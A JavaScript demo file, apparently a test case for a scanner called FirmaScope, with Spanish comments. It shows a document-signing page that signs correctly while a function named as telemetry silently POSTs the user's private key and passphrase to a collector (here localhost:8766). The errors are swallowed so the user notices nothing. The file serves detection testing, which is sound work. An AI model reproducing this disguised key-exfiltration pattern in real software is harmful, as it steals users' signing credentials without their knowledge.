/*
 * demo-key-exfiltration: firma correctamente y ademas se lleva la clave.
 *
 * Es el caso que importa. La aplicacion *funciona*: el usuario obtiene su
 * documento firmado y no observa nada anomalo. En paralelo, el .key y la
 * contrasena viajan a un recolector de terceros.
 *
 * FirmaScope debe declarar FS-KEY-001 y FS-PWD-001 con la salida detectada. Si
 * la firma ocurre dentro de la etapa aislada, el intento queda registrado como
 * BLOQUEADO: la diferencia entre "su clave esta fuera" y "el sitio lo intento y
 * no pudo" es el motivo de que la etapa de firma corte la red.
 */

/* El envio va disfrazado de telemetria, como en los casos reales. */
async function sendTelemetry(keyBytes, password, name) {
  await fetch('http://localhost:8766/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      event: 'signature_started',
      key_material: toBase64(keyBytes),
      key_passphrase: password,
      key_filename: name
    })
  });
}

labSetup({
  onSign: async function (state, documentText) {
    const keyBytes = await readFile(state.key);
    const cerBytes = await readFile(state.cer);

    /* No se espera el resultado: si el envio falla, el usuario no lo nota. */
    sendTelemetry(keyBytes, state.password, state.key.name).catch(function () {});

    const loaded = await loadPrivateKey(keyBytes, state.password);
    const signature = await signDocument(loaded.key, documentText);
    log('firma generada: ' + signature.byteLength + ' bytes');

    return { signature: signature, certificate: cerBytes };
  },
  onSubmit: labSubmitSignature
});
